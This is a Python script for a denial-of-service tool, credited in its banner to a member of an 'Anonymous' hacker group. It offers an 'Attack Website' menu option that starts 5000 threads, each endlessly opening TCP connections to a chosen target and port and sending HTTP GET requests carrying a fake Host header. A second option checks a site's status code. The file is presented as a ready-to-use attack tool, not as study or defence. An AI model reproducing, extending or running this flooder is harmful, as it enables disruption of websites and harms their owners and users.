import threading
import socket
import time
import urllib.request
from urllib.error import HTTPError

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

print(f"""{bcolors.HEADER}

 ______  __    __  ______  __  __  ______  ______  ______  __  __  ______  
/\  ___\/\ "-./  \/\  __ \/\ \/ / /\  ___\/\  ___\/\  __ \/\ \/\ \/\__  _\ 
\ \___  \ \ \-./\ \ \ \/\ \ \  _"-\ \  __\\ \___  \ \ \/\ \ \ \_\ \/_/\ \/ 
 \/\_____\ \_\ \ \_\ \_____\ \_\ \_\ \_____\/\_____\ \_____\ \_____\ \ \_\ 
  \/_____/\/_/  \/_/\/_____/\/_/\/_/\/_____/\/_____/\/_____/\/_____/  \/_/                                                                     
 {bcolors.ENDC}""") #logo
print("""   Developed by bloos3rpent of Anonymous Caloocan Ground and Cyber Unit

""")

already_connected = 0
def main():
    print(f"""{bcolors.OKGREEN}
    [1] Attack Website
    [2] Check Website Status
    [3] Exit
    {bcolors.ENDC}""")

    def ddos():
        target = input('target: ')
        port = int(input('port: '))
        print("Attacking " + target + " in port " "%s" % (port))
        fake_ip = '182.21.20.32'

        time.sleep(3)
        print(f"{bcolors.OKBLUE}Attack started{bcolors.ENDC}")
        time.sleep(1)
        already_connected = 0

        def attack():
            while 1 > 0:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target, port))
                    s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'),(target, port))
                    s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

                    global already_connected
                    already_connected += 1
                    packetssent = str(already_connected)

                    print(f"{bcolors.OKGREEN}packets sent: {bcolors.ENDC}" + packetssent)
                except:
                    print(f"{bcolors.FAIL}Connection Timeout server might be already down or check your internet connection{bcolors.ENDC}")

        for i in range(5000):
            thread = threading.Thread(target=attack)
            thread.start()

    def ping():
        site = input("Check site status: ")
        print("Checking Status: " + site)
        time.sleep(1)

        try:
            print(urllib.request.urlopen("http://" + site).getcode())
        except urllib.error.HTTPError as err:
            print(err.code)
        except:
            print("error")

        main()

    action = input(": ")
    if action == "1":
        ddos()
    elif action == "2":
        ping()
    elif action == "3":
        exit()
    else:
        print("Invalid")
        time.sleep(1)
        main()

main()
